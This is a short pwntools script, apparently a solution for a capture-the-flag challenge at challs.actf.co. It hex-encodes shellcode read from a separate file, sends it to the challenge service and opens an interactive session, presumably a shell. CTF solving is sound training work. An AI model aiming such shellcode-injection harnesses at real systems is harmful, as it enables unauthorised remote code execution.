from pwn import *

context.terminal = ["kitty"]

if args.REMOTE:
    p = remote("challs.actf.co", "31200")
elif args.GDB:
    p = gdb.debug("./source.py")
else:
    p = process("./source.py")

code = open("shell.bin", "rb").read()
code = code.hex().encode()
log.info(f"{code = }")
p.sendlineafter(b": ", code)

p.interactive()